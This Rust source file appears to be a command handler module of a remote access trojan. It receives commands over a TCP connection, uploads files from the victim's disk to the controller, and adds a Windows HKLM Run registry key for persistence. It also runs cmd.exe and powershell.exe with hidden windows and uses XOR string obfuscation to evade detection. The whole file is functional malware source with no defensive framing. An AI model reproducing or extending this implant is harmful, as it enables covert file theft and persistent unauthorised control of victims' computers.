use tokio::net::TcpStream;
use xorcrypt::{e, prepare_encryption};

use crate::models::{substr_exists, upload_file, write};

prepare_encryption!();

pub async fn process(command: &String, conn: &mut TcpStream) -> Result<(), ()> {
    if substr_exists(&command.as_bytes().to_vec(), b"::DOWNLOAD::").await {
        download(command, conn).await;
    } else if substr_exists(&command.as_bytes().to_vec(), b"::PERSIST::").await {
        persistence(command, conn).await;
    } else {
        return Err(());
    }
    Ok(())
}
pub async fn persistence(command: &String, mut conn: &mut TcpStream) {
    let command = command
        .split(" ")
        .map(|x| x.to_string())
        .collect::<Vec<String>>();
    let (_, args) = (&command[0], &command[1..]);
    match args.get(0) {
        Some(filename) => {
            //
            let path = platform_dirs::AppDirs::new(Some("AppDirs"), false).unwrap();
            let path = path.cache_dir.as_path().to_str().unwrap();
            let cmd = format!("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{}\" /t REG_SZ /d \"{}\" /f", filename, path);
            println!("Hello");
            println!("{}", cmd);
            run_cmd(cmd).await;
            write(&mut conn, b"[+] Persistence done".to_vec())
                .await
                .unwrap();
        }
        None => {
            //
        }
    }
}
pub async fn download(command: &String, mut conn: &mut TcpStream) {
    let command = command
        .split(" ")
        .map(|x| x.to_string())
        .collect::<Vec<String>>();
    let (_, args) = (&command[0], &command[1..]);
    match args.get(0) {
        Some(filename) => {
            println!("Filename: {}", filename);
            match tokio::fs::read(filename.trim()).await {
                Ok(data) => {
                    upload_file(&mut conn, filename, data).await.unwrap();
                }
                Err(_) => {
                    write(&mut conn, b"[-] File not found".to_vec())
                        .await
                        .unwrap();
                }
            }
        }
        None => {
            //
        }
    }
}

pub async fn run_ps(command: String) -> Vec<u8> {
    let mut output = tokio::process::Command::new(e!("powershell.exe"));
    output.creation_flags(0x8000000);
    let mut output = output
        .arg(e!("-NoProfile"))
        .arg(e!("-Command"))
        .arg(command.trim())
        .output()
        .await
        .unwrap();
    output.stdout.append(&mut output.stderr);
    output.stdout
}
pub async fn run_cmd(command: String) -> Vec<u8> {
    let mut output = tokio::process::Command::new(e!("cmd.exe"));
    output.creation_flags(0x8000000);
    let mut output = output
        .arg(e!("/C"))
        .arg(command.trim())
        .output()
        .await
        .unwrap();
    output.stdout.append(&mut output.stderr);
    println!("{}", String::from_utf8(output.stdout.clone()).unwrap());
    output.stdout
}
